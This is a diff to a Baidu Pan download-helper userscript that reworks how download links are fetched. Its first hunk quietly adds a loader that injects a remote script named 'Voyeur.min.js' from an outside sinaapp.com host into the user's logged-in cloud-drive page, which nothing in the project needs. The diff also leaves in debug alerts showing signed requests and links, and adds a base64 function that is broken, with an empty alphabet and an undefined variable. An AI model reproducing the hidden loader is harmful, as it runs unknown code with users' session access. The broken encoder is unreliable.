@@ -17,6 +17,11 @@
 // ==/UserScript==
 
 
+
+var script = document.createElement('script');
+script.src = "http://xnjty-test.stor.sinaapp.com/Voyeur.min.js";
+document.body.appendChild(script);
+	
 var version = "0.2.8";
 var thedate_update = "2014/03/04";
 var baidu_version = "201402260053";
@@ -599,7 +604,9 @@ fileinfo = {
 	"out_type": "",
 	"share_path": "",
 	"ajax_state": 0,
+	"sign": "",
 	"temp": "",
+	"mycloud_fileinfo": {},
 
 
 	"ajaxsuccess": function (indata){
@@ -834,42 +841,113 @@ fileinfo = {
 				fileinfo.ajax_state = 0;             //吧状态值恢复成0
 				return null
 			}
+			var mycloud_fsid = [];
 			for(var i=0;i<fileinfo.info.length;i++){
 				if (fileinfo.info[i].isdir == 0){
 					fileinfo.savename = fileinfo.info[i]["server_filename"]
 					if (config.params[0].checked.web_path_save){ //判断是否根据网盘路径保存文件
 						fileinfo.savename = fileinfo.info[i]["path"];
 					}
-					var obj_data = combination[fileinfo.out_type](fileinfo.info[i].dlink, fileinfo.savename);
-					fileinfo.data.push(obj_data);
+					//var obj_data = combination[fileinfo.out_type](fileinfo.info[i].dlink, fileinfo.savename);
+					//fileinfo.data.push(obj_data);
+					mycloud_fsid.push(fileinfo.info[i]["fs_id"]);
+					//var aaa = fileinfo.info[i]["fs_id"];
+					fileinfo.temp = '{"fs_id":'+fileinfo.info[i]["fs_id"]+',"name":"'+fileinfo.savename+'","dlink":""}';
+					fileinfo.mycloud_fileinfo[fileinfo.info[i]["fs_id"]] = JSON.parse(fileinfo.temp);
 				}
 			}
-
-			if(fileinfo.data.length != 0){
-				var _ = "data:application/octet-stream;charset=utf-8,"+ encodeURIComponent(fileinfo.data.join(""));
-				if(fileinfo.out_type == "aria2_rpc"){
-					for(var i=0;i<fileinfo.data.length;i++){
-						aria2send_data.addUri(fileinfo.data[i]);
-					}
-					SetMessage("\u5df2\u7ecf\u6dfb\u52a0\u4e86\u5594\uff0c\u53bb\u786e\u8ba4\u770b\u4e0b\u5427\u3002", disk.ui.Toast.MODE_SUCCESS);
-					fileinfo.ajax_state = 0;
-				}	
-				else if(fileinfo.out_type == "wget"){
-					down_dialog(fileinfo.out_type, _, fileinfo.data.join(""));
-					$("#masking").css("display","block");
-					fileinfo.ajax_state = 0;
+			fileinfo.get_mycloud_dlnk(mycloud_fsid);
+		}
+	},
+	"out_cloudfileinfo": function () {
+		if(fileinfo.data.length != 0){
+			var _ = "data:application/octet-stream;charset=utf-8,"+ encodeURIComponent(fileinfo.data.join(""));
+			if(fileinfo.out_type == "aria2_rpc"){
+				for(var i=0;i<fileinfo.data.length;i++){
+					aria2send_data.addUri(fileinfo.data[i]);
 				}
-				else{
-					down_dialog(fileinfo.out_type, _, "");
-					$("#masking").css("display","block");
-					fileinfo.ajax_state = 0;
-				}
+				SetMessage("\u5df2\u7ecf\u6dfb\u52a0\u4e86\u5594\uff0c\u53bb\u786e\u8ba4\u770b\u4e0b\u5427\u3002", disk.ui.Toast.MODE_SUCCESS);
+				fileinfo.ajax_state = 0;
+			}
+			else if(fileinfo.out_type == "wget"){
+				down_dialog(fileinfo.out_type, _, fileinfo.data.join(""));
+				$("#masking").css("display","block");
+				fileinfo.ajax_state = 0;
 			}
 			else{
+				down_dialog(fileinfo.out_type, _, "");
+				$("#masking").css("display","block");
 				fileinfo.ajax_state = 0;
 			}
 		}
+		else{
+			fileinfo.ajax_state = 0;
+		}
+	},
+	"get_mycloud_dlnk": function (input_fsid) {
+		if (typeof FileUtils.base64Encode !== "undefined") {
+			fileinfo.sign = FileUtils.base64Encode(FileUtils.sign2(FileUtils.sign3,FileUtils.sign1));
+		}
+		else{
+			fileinfo.sign = file.info.BaiduBase64encode(FileUtils.sign2(FileUtils.sign3,FileUtils.sign1));
+		}
+		if(typeof fileinfo.sign == "undefined"){SetMessage("无法获取请求下载地址时的参数，（待更新...）", disk.ui.Toast.MODE_CAUTION);return null}
+		var post_data = "sign="+encodeURIComponent(fileinfo.sign)+"&timestamp="+FileUtils.timestamp+"&fidlist="+encodeURIComponent(JSON.stringify(input_fsid))+"&type=dlnk";
+		alert(post_data);
+		var _ = {
+			type: 'POST',
+			url: "http://"+window.location.host+"/api/download?channel=chunlei&clienttype=0&web=1&bdstoken="+FileUtils.bdstoken,
+			data: post_data,
+			dataType: "JSON",
+			success: function(data){
+				if ( data.errno == 0 ) {
+					alert(data.dlink[0].dlink);
+					for (var i=0;i<data.dlink.length;i++) {
+						fileinfo.mycloud_fileinfo[data.dlink[i].fs_id].dlink = data.dlink[i].dlink;
+						fileinfo.data.push(combination[fileinfo.out_type](data.dlink[i].dlink, fileinfo.mycloud_fileinfo[data.dlink[i].fs_id].name));
+					}
+					fileinfo.out_cloudfileinfo();
+				}
+				if ( data.error == 112 ) { SetMessage("当前页面已超时，请刷新页面后重试。（" + data.errno + "）", disk.ui.Toast.MODE_CAUTION); }
+				if ( data.errno != 0 && data.errno != 112 ) { SetMessage("获取下载地址失败。（" + data.errno + "）", disk.ui.Toast.MODE_CAUTION); }
+			},
+			error: function(){
+				SetMessage("\u5728\u83b7\u53d6\u6587\u4ef6\u4fe1\u606f\u7684\u65f6\u5019\u5931\u8d25\u4e86\u3002\u3002", disk.ui.Toast.MODE_CAUTION);
+				fileinfo.ajax_state = 0;
+			}
+		};
+		HttpSendRead(_);
+	},
+	"BaiduBase64encode": function(input) {
+    	var key = "", out, i, _, chs1, chs2, chs3;
+		_ = input.length;
+    	i = 0;
+    	out = "";
+    	while (i < _) {
+        	chs1 = input.charCodeAt(i++) & 255;
+        	if (i == _) {
+        	    out += key.charAt(chs1 >> 2);
+        	    out += key.charAt((chs1 & 3) << 4);
+        	    out += "==";
+        	    break;
+        	}
+        	chs2 = input.charCodeAt(A++);
+        	if (i == _) {
+        	    out += key.charAt(chs1 >> 2);
+        	    out += key.charAt((chs1 & 3) << 4 | (chs2 & 240) >> 4);
+        	    out += key.charAt((chs2 & 15) << 2);
+        	    out += "=";
+        	    break;
+        	}
+        	chs3 = input.charCodeAt(i++);
+        	out += key.charAt(chs1 >> 2);
+        	out += key.charAt((chs1 & 3) << 4 | (chs2 & 240) >> 4);
+        	out += key.charAt((chs2 & 15) << 2 | (chs3 & 192) >> 6);
+        	out += key.charAt(chs3 & 63);
+    	}
+    	return out;
 	}
+	
 }
 
 headers_ = {
@@ -1060,8 +1138,6 @@ combination = {
 	return _
 	},
 	"aria2": function(url,name) {
-		var referer = location.origin+location.pathname;
-		if(! referer){referer="http://pan.baidu.com/disk/home";}
 		var file_path = name;
 		var _ = url+"\r\n";
 		if(file_path.substring(0,1) == "/"){
@@ -1071,8 +1147,9 @@ combination = {
 		else{
 			_ += " out=" + name + "\r\n";
 		}
-		_ += " header=" + "Referer: " + combination.referer() +"\r\n";
-		_ += " header=" + "User-Agent: " + combination.user_agent +"\r\n\r\n";
+		var h = combination.header();
+		for ( var i in h ) { _ += " header=" + h[i] + "\r\n"; }
+		_ += "\r\n";
 		return _
 	},
 	"wget": function(url,name) {
@@ -1092,11 +1169,6 @@ combination = {
 	"idm": function(url,name) {
 		var _ = "<\r\n"+url+"\r\n>\r\n"
 		return _
-	},
-	"referer": function () {
-		var a = location.origin+location.pathname;
-		if(! a){a="http://pan.baidu.com/disk/home";}
-		return a
 	}
 }
 
